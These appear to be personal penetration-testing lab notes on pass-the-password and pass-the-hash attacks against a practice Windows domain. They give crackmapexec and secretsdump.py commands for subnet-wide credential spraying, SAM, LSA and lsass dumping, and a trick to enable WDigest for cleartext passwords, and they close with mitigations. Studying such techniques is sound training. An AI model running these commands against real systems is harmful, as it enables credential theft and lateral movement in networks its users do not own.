---
title: "Pass Attacks using cme and secretsdump"
_build:
  list: never
---

Kind of password/hash spraying  


.............Pass the Password / Pass the Hash  
.............Exploit PASSWORD REUSE  

Tool 1 : crackmapexec (CME)  
Tool 2 : secretsdump.py

## 1. Pass the password
![Pasted image 20251203025444](images/Pasted-image-20251203025444.png)  


## 2. Pass the hash
![Pasted image 20251203025548](images/Pasted-image-20251203025548.png)  


### 2.1. Dump SAM hashes
![Pasted image 20251203025653](images/Pasted-image-20251203025653.png)  


### 2.2. Enumerate shares
![Pasted image 20251203025711](images/Pasted-image-20251203025711.png)  


### 2.3. Modules in CME
![Pasted image 20251203025908](images/Pasted-image-20251203025908.png)  
Examples:
- *****lsassy (best?)
- *****wdigest
- gpp_password
- impersonation
- keypass_discover : if you find a keypass database
To define a module just do `-M <name>` at the end, eg: `crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth -M lsassy`

### 2.4. Dump lsass with lsassy
![Pasted image 20251203025949](images/Pasted-image-20251203025949.png)  
- lsass is responsible for enforcing the security policy on a system, but for whatever reason it store CREDENTIALS   
- So if there is a user logged in, this may be able to dump out credentials in real time


### 2.5. CME Database
![Pasted image 20251203031535](images/Pasted-image-20251203031535.png)  





### OTHER (Better?) option to dump secrets: secretsdum.py

![Pasted image 20251203025511](images/Pasted-image-20251203025511.png)  



## How I went about it


### Trying to pass the Password
`crackmapexec smb 192.168.13.0/24 -u fcastle -d MARVEL.local -p Password1`  

![Pasted image 20251203210113](images/Pasted-image-20251203210113.png)  


### Trying to pass the hash
`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth`  

![Pasted image 20251203235324](images/Pasted-image-20251203235324.png)  

-> Dump that hashes from pwned machines:
`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth --sam`  
![Pasted image 20251203235611](images/Pasted-image-20251203235611.png)  


-> Enumerate shares on pwned machines:
`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth --shares`  
![Pasted image 20251203235758](images/Pasted-image-20251203235758.png)  


-> Dumping LSA:
`crackmapexec smb 192.168.13.0/24 -u administrator -H LM:NT --local-auth --LSA`
- Some secrets are good some are not
- may try to crack DCC2 Hashes offline that we get from here  
  ![Pasted image 20251204001353](images/Pasted-image-20251204001353.png)  
- These passwords might change though, the hashes could be old

Basic strategy is: 
- Get on to a machine
- Dump out the secrets/SAM
- Take that Results (passwords or SAM hashes) and start passing it
- METHODOLOGY SO FAR:(EXAMPLE)
  `llmnr -> machine hash -> cracked (hashcat) -> spray the password (passing) -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts`


-> Using `lsassy` module
`crackmapexec smb 192.168.13.0/24 -u administrator -H NT:LM --local-auth -M lsassy`
- if there is any secrets stored in the memory, this should be able to dump that out

FOUND NOTHING



-> Using CMEDB
`cmedb`  
![Pasted image 20251204005020](images/Pasted-image-20251204005020.png)  
- hosts - list of all the IP addresses used in crackmapexec
- creds - dump all the creds that have ever been pulled before
- good if lots of machines are pwned and need to manage them


---

## Secretsdump

```
secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.138.137
secretsdump.py administrator:@192.168.138.137 -hashes <NT:LM>
```

-> grab any and all hashes/secrets  
-> main things:  
	-> SAM Hashes - administrator acc and user acc  
	-> Guest acc and WDAGUtility Account Hashes do no matter (?)  
	-> Crack DCC2 Hashes  
-> During enumeration there was this fact that we should be on the lookout for old machines....one of the reasons is that that have something called "WDIGEST" that is a older protocol that is enabled by default on olde windows machines (windows 7/8 , 2008 R2 server/2012 server etc not sure)  
So if a domain admin has previously visited a now compromised machine we will be able to see their password in clear text (WHAT?)  
So they can be present in secretsdump  
	-> An attack is possible here: flip the switch 'on' for wdigest on any machine that has it disabled and you can get the passwords later! (Watering hole attack)  
	-> when doing this on pentest: flip the switch back 'off', otherwise the system becomes more vulnerable (BAD)  


do this pass the hash to EVERY MACHINE POSSIBLE  

---

## Mitigation

Hard to completely prevent, but can make it harder to achive:  
- Limit account re-use:
	- Avoid re-useing local admin password
	- Disable Guest and Administrator accounts
	- Limit who is a local administrator (least privilege)
- Utilize strong passwords:
	- The longer the better (>14 characters)
	- Avoid using common words
	- Long sentences?
- Privilege Access Management (PAM)
	- Check out/in sensitve accounts when needed
	- Automatically rotate passwods on check out and check in
	- Limits pass attacks on hash/password is strong and constantly rotated
